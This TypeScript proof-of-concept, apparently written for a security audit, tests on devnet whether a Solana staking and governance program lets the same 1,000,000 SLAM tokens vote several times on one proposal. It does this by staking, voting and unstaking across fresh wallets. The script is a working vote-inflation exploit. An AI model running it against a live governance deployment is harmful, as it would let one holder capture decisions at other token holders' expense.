/**
 * PoC: does stake-recycling let the SAME tokens vote more than once on ONE
 * proposal? Cycle a single 1,000,000-SLAM pot through N fresh wallets; each
 * stakes, votes YES on the same proposal, and unstakes so the next wallet can
 * reuse the identical tokens. If the proposal's yes_weight ends up ~N x the
 * token amount, the vote is inflatable without holding more tokens.
 *
 * Read-only intent: runs on devnet, uses throwaway wallets, votes YES on a
 * throwaway proposal. Proves/So disproves the §4 governance concern in AUDIT_BRIEF.md.
 */
import * as anchor from "@coral-xyz/anchor";
import { Keypair, PublicKey, SystemProgram, LAMPORTS_PER_SOL, Transaction } from "@solana/web3.js";
import {
  getOrCreateAssociatedTokenAccount, getAssociatedTokenAddress, transfer,
  getAccount, TOKEN_PROGRAM_ID,
} from "@solana/spl-token";

const SLAM_MINT = new PublicKey("8KmGd7euYsg3fBbCcc4LnVQhXzkGxAF2t9ZYdUy9BQqC");
const DEC = 1_000_000;
const AMOUNT = 1_000_000 * DEC; // 1,000,000 SLAM — exactly meets the propose threshold
const CYCLES = 3;

(async () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const conn = provider.connection;
  const admin = (provider.wallet as anchor.Wallet).payer;
  const staking = anchor.workspace.SlamStaking as anchor.Program<any>;
  const gov = anchor.workspace.SlamGovernance as anchor.Program<any>;

  const sPda = (s: string) => PublicKey.findProgramAddressSync([Buffer.from(s)], staking.programId)[0];
  const stakingConfig = sPda("staking-config");
  const vaultAuthority = sPda("staking-vault-authority");
  const stakeVault = sPda("staking-stake-vault");
  const rewardVault = sPda("staking-reward-vault");
  const stakePda = (o: PublicKey) =>
    PublicKey.findProgramAddressSync([Buffer.from("stake"), o.toBuffer()], staking.programId)[0];

  const govConfig = PublicKey.findProgramAddressSync([Buffer.from("gov-config")], gov.programId)[0];
  const proposalPda = (id: number) =>
    PublicKey.findProgramAddressSync(
      [Buffer.from("gov-proposal"), new anchor.BN(id).toArrayLike(Buffer, "le", 8)], gov.programId)[0];
  const votePda = (p: PublicKey, v: PublicKey) =>
    PublicKey.findProgramAddressSync([Buffer.from("gov-vote"), p.toBuffer(), v.toBuffer()], gov.programId)[0];

  const adminSlam = await getAssociatedTokenAddress(SLAM_MINT, admin.publicKey);

  // Fund a throwaway wallet with SOL (fees + rent) and hand it the SLAM pot.
  const fundSol = async (to: PublicKey, sol: number) => {
    const tx = new Transaction().add(SystemProgram.transfer({
      fromPubkey: admin.publicKey, toPubkey: to, lamports: sol * LAMPORTS_PER_SOL }));
    await provider.sendAndConfirm(tx, []);
  };

  const wallets = Array.from({ length: CYCLES }, () => Keypair.generate());
  console.log(`Attacker wallets: ${wallets.map((w) => w.publicKey.toBase58().slice(0, 8)).join(", ")}`);

  // Seed wallet[0] with SOL + the full 1,000,000 SLAM pot.
  await fundSol(wallets[0].publicKey, 0.3);
  const w0Slam = (await getOrCreateAssociatedTokenAccount(conn, admin, SLAM_MINT, wallets[0].publicKey)).address;
  await transfer(conn, admin, adminSlam, w0Slam, admin, AMOUNT);
  console.log(`Seeded wallet[0] with ${AMOUNT / DEC} SLAM (this is the ONLY pot — no more is added)\n`);

  const stake = async (w: Keypair, slamAta: PublicKey) =>
    (staking.methods as any).stake(new anchor.BN(AMOUNT), 0).accounts({
      owner: w.publicKey, config: stakingConfig, stakeAccount: stakePda(w.publicKey),
      ownerSlamAccount: slamAta, stakeVault, tokenProgram: TOKEN_PROGRAM_ID,
      systemProgram: SystemProgram.programId,
    }).signers([w]).rpc();

  const unstake = async (w: Keypair, slamAta: PublicKey) =>
    (staking.methods as any).unstake().accounts({
      owner: w.publicKey, config: stakingConfig, stakeAccount: stakePda(w.publicKey),
      vaultAuthority, stakeVault, rewardVault, ownerSlamAccount: slamAta,
      tokenProgram: TOKEN_PROGRAM_ID,
    }).signers([w]).rpc();

  // Open a fresh proposal from wallet[0] (which now has a stake).
  const cfg = await (gov.account as any).govConfig.fetch(govConfig);
  const pid = cfg.proposalCount.toNumber();
  const proposal = proposalPda(pid);

  let prevSlam = w0Slam;
  for (let i = 0; i < CYCLES; i++) {
    const w = wallets[i];
    let slamAta = i === 0 ? w0Slam
      : (await getOrCreateAssociatedTokenAccount(conn, admin, SLAM_MINT, w.publicKey)).address;

    if (i > 0) {
      await fundSol(w.publicKey, 0.3);
      // Move the SAME pot from the previous wallet to this one.
      await transfer(conn, admin /* fee payer */, prevSlam, slamAta, wallets[i - 1], AMOUNT);
    }

    await stake(w, slamAta);

    if (i === 0) {
      await (gov.methods as any).createProposal(
        "PoC: stake-recycling double vote",
        "Throwaway proposal to test whether one pot of SLAM can vote multiple times.")
        .accounts({
          proposer: w.publicKey, config: govConfig, proposal,
          proposerStake: stakePda(w.publicKey), systemProgram: SystemProgram.programId,
        }).signers([w]).rpc();
      console.log(`Proposal #${pid} created.`);
    }

    await (gov.methods as any).castVote(1).accounts({
      voter: w.publicKey, config: govConfig, proposal,
      voteRecord: votePda(proposal, w.publicKey), voterStake: stakePda(w.publicKey),
      systemProgram: SystemProgram.programId,
    }).signers([w]).rpc();

    const p = await (gov.account as any).proposal.fetch(proposal);
    console.log(`  cycle ${i + 1}: wallet ${w.publicKey.toBase58().slice(0, 8)} voted YES → yes_weight = ${p.yesWeight.toNumber() / DEC} SLAM`);

    await unstake(w, slamAta); // free the pot for the next wallet
    prevSlam = slamAta;
  }

  const final = await (gov.account as any).proposal.fetch(proposal);
  const yes = final.yesWeight.toNumber() / DEC;
  console.log(`\n── result ──`);
  console.log(`tokens actually held by the attacker: ${AMOUNT / DEC} SLAM`);
  console.log(`yes_weight recorded on the proposal:  ${yes} SLAM  (${(yes / (AMOUNT / DEC)).toFixed(1)}x)`);
  console.log(yes > AMOUNT / DEC
    ? `\nEXPLOITABLE: ${AMOUNT / DEC} SLAM cast ${(yes / (AMOUNT / DEC)).toFixed(0)}x the votes it should.`
    : `\nNOT exploitable: weight did not exceed the token count.`);
})().catch((e) => { console.error(e); process.exit(1); });
